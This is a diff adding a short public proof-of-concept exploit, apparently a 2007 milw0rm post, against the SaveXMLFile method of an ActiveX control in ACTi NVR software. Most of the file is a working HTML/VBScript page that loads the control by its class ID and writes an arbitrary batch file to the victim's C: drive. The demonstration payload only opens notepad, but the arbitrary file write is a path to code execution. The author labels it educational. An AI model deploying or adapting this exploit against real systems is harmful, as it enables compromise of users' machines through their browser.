@@ -1,0 +1,42 @@
+--------------------------------------------------------------------------------------------
+ NVR SP2 2.0 nvUtility.Utility.1 (nvUtility.dll v. 1.0.14.0) "SaveXMLFile()" Inscure Method
+ url: http://www.acti.com/index.asp
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ 
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not be responsible for any damage.
+ 
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ all software that use this ocx are vulnerable to this exploits.
+
+ This control is marked as:
+ RegKey Safe for Script: False
+ RegKey Safe for Init: False
+ Implements IObjectSafety: True
+ IDisp Safe: Safe for untrusted: caller
+ KillBitSet: Falso
+--------------------------------------------------------------------------------------------
+
+<object classid='clsid:A0D43FB0-116B-47AB-80FB-6DCFA92A03E3' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  Dim mStr
+  Dim MyMsg  
+   mStr = "echo off" & vbCrLf & _
+          "cls" & vbCrLf & _
+          "echo Hello World!" & vbCrLf & _
+          "cmd.exe /c notepad.exe" & vbCrLf & _
+          "pause"
+
+   test.SaveXMLFile "c:\shinnai.bat", mStr
+   MyMsg = MsgBox("Exploit completed!")
+ End Sub
+</script>
+
+# milw0rm.com [2007-08-27]
